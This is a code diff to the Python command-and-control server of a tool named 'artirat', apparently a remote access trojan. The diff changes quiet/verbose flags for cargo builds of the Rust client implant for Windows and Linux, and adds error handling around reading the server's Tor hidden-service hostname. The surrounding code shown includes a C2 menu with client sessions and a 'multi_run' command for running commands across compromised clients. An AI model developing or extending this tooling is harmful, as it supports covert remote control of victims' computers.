@@ -394,26 +394,22 @@ EXE_BUILD_TARGETS = [
 ]
 
 
-def _stream_cargo(cmd, cwd, env, quiet=False):
-    if quiet:
-        r = subprocess.run(cmd, cwd=cwd, env=env, capture_output=True, text=True)
-        if r.stdout:
-            print(r.stdout)
-        if r.stderr:
-            print(r.stderr, file=sys.stderr)
-        return r.returncode
-    process = subprocess.Popen(
-        cmd, cwd=cwd, env=env,
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-        text=True, bufsize=1,
-    )
-    for line in process.stdout:
-        print(line, end="", flush=True)
-    process.wait()
-    return process.returncode
+def _stream_cargo(cmd, cwd, env, verbose=False):
+    if verbose:
+        process = subprocess.Popen(
+            cmd, cwd=cwd, env=env,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1,
+        )
+        for line in process.stdout:
+            print(line, end="", flush=True)
+        process.wait()
+        return process.returncode
+    r = subprocess.run(cmd, cwd=cwd, env=env, capture_output=True, text=True)
+    return r.returncode
 
 
-def build_client(target: str, quiet=False):
+def build_client(target: str, verbose=False):
     targets = {
         "windows": "x86_64-pc-windows-gnu",
         "linux": "x86_64-unknown-linux-gnu",
@@ -448,7 +444,7 @@ def build_client(target: str, quiet=False):
     if rustflags:
         env["RUSTFLAGS"] = rustflags
 
-    rc = _stream_cargo(cmd, os.path.join(".", "artirat-client"), env, quiet)
+    rc = _stream_cargo(cmd, os.path.join(".", "artirat-client"), env, verbose)
     if rc != 0:
         print(f"[-] Build failed for {t} (exit code {rc})")
         return False
@@ -583,21 +579,21 @@ def c2_menu(manager: ClientManager):
                 print(f"[Backgrounded session with client {cid}]")
         elif cmd == "build":
             if len(parts) < 2:
-                print("Usage: build <target> [--quiet]")
-                print("       build all [--quiet]")
+                print("Usage: build <target> [--verbose]")
+                print("       build all [--verbose]")
                 print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                 continue
-            quiet = "--quiet" in parts
+            verbose = "--verbose" in parts
             target_arg = parts[1]
             if target_arg == "all":
                 targets = EXE_BUILD_TARGETS
                 for t in targets:
                     print(f"\n{'='*60}")
-                    build_client(t, quiet=quiet)
+                    build_client(t, verbose=verbose)
                 print(f"\n{'='*60}")
                 print("[+] All builds finished")
             else:
-                build_client(target_arg, quiet=quiet)
+                build_client(target_arg, verbose=verbose)
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
@@ -667,9 +663,12 @@ def run_c2_server():
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
     controller = connect_tor()
-    file = open('/var/lib/tor/art1rat/hostname',"r")
-    hostname = file.read()
-    write_hostname(hostname)
+    try:
+        file = open('/var/lib/tor/artirat-server/hostname',"r")
+        hostname = file.read()
+        write_hostname(hostname)
+    except:
+        pass
     print()
     c2_menu(manager)
 
